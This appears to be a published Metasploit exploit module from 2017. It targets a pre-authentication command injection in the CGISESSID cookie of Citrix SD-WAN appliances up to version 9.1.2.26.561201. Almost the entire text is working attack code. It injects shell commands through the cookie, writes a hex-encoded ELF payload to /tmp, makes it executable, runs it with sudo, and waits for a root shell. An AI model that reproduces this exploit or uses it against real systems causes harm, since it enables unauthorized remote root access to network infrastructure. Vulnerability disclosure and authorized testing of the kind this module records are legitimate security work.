# Date: 02/20/2017
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.citrix.com
# Software Link: https://www.citrix.com/downloads/cloudbridge/
# Version: 9.1.2.26.561201
# Tested on: 9.1.2.26.561201 (OS partition 4.6)
#            
# CVE : (awaiting cve)
 
# vuln: CGISESSID Cookie parameter
#  associated vuln urls:
#                       /global_data/ 
#           /global_data/headerdata 
#           /log
#           /
#           /r9-1-2-26-561201/configuration/ 
#           /r9-1-2-26-561201/configuration/edit 
#           /r9-1-2-26-561201/configuration/www.citrix.com [CGISESSID cookie]
#
# Description PreAuth Remote Root Citrix SD-WAN <= v9.1.2.26.561201. This exploit leverages a command injection bug. 
#
# xort @ Critical Start
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Citrix SD-WAN CGISESSID Cookie Remote Root&#039;,
                    &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in the Citrix SD-WAN Appliace Version <=  v9.1.2.26.561201. The vulnerability exist in a section of the machine&#039;s session checking functionality. If the CGISESSID cookie holds shell-command data - it is used in a call to system where input is processed unsanitized.
            },
            &#039;Author&#039;         =>
                [
                    &#039;xort@Critical Start&#039;, # vuln + metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;none&#039;, &#039;none&#039;],
                ],
            &#039;Platform&#039;      => [ &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
             &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },
 
            &#039;Targets&#039;        =>
                [
                    [&#039;Linux Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ],
                ],
            &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
                    Opt::RPORT(443),
                ], self.class)
    end
 
    def run_command(cmd)
 
        vprint_status( "Running Command...\n" )
 
        # send request with payload 
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
                        &#039;uri&#039;     => "/global_data/",
            &#039;vars_post&#039; => {
                &#039;action&#039; => &#039;logout&#039;
            },
                    &#039;headers&#039; => {
                            &#039;Connection&#039; => &#039;close&#039;,
                            &#039;Cookie&#039; => &#039;CGISESSID=e6f1106605b5e8bee6114a3b5a88c5b4`&#039;+cmd+&#039;`; APNConfigEditorSession=0qnfarge1v62simtqeb300lkc7;&#039;,
                        }
 
        })
 
 
        # pause to let things run smoothly
        sleep(2)
 
 
    end
 
     
    def exploit
        # timeout
        timeout = 1550;
 
        # pause to let things run smoothly
        sleep(2)
 
         #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
 
                        cmd = datastore[&#039;CMD&#039;]
 
                        # Encode cmd payload
 
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\\\\\\\\\\\x\1\2&#039;)
 
            # upload elf to /tmp/n , chmod +rx /tmp/n , then run /tmp/n (payload)
                        run_command("echo -e #{encoded_cmd}>/tmp/n")
                        run_command("chmod 755 /tmp/n")
                        run_command("sudo /tmp/n")
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\\\\\\\\\\\x\1\2&#039;)
 
            # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command("echo -e #{encoded_elf}>/tmp/m")
                        run_command("chmod 755 /tmp/m")
                        run_command("sudo /tmp/m")
 
            # wait for magic
                        handler
             
                end
 
 
    end
end

